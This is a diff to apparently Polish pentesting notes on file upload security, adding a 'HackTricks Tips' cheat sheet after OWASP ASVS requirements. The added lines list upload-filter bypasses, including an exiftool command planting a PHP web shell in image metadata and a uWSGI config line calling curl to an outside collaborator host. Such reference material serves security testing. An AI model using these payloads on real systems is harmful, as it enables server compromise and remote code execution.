@@ -253,3 +253,17 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 |---|---|---|
 | V5.1.1 | File Handling Documentation | Verify that the documentation defines the permitted file types, expected file extensions, and maximum size (including unpacked size) for each upload feature. Additionally, ensure that the documentation specifies how files are made safe for end-users to download and process, such as how the application behaves when a malicious file is detected. |
 | V5.2.3 | File Upload and Content | Verify that the application checks compressed files (e.g., zip, gz, docx, odt) against maximum allowed uncompressed size and against maximum number of files before uncompressing the file. |
+
+
+---
+
+## HackTricks Tips
+
+- **Extension bypass (PHP)**: `.php5`, `.phtml`, `.phar`, `.inc`, `.hphp`, `.ctp` + case variations: `.pHp5`, `.PhAr`
+- **Null byte**: `file.php%00.png` — truncates extension
+- **Double extension Apache**: `file.php.png` executes jeśli Apache configured to run `.php` anywhere
+- **PHP in image metadata**: `exiftool -Comment="<?php system(\$_POST['cmd']); ?>" img.jpg`
+- **GD compression survive**: PNG PLTE/IDAT/tEXt chunk injection (synacktiv)
+- **Upload `.htaccess`**: allow execution of custom extensions
+- **Windows NTFS ADS**: `file.asp::$data.` bypass extension block
+- **uWSGI RCE**: write/modify `uwsgi.ini` → `@(exec://curl http://collaborator)` triggers on restart
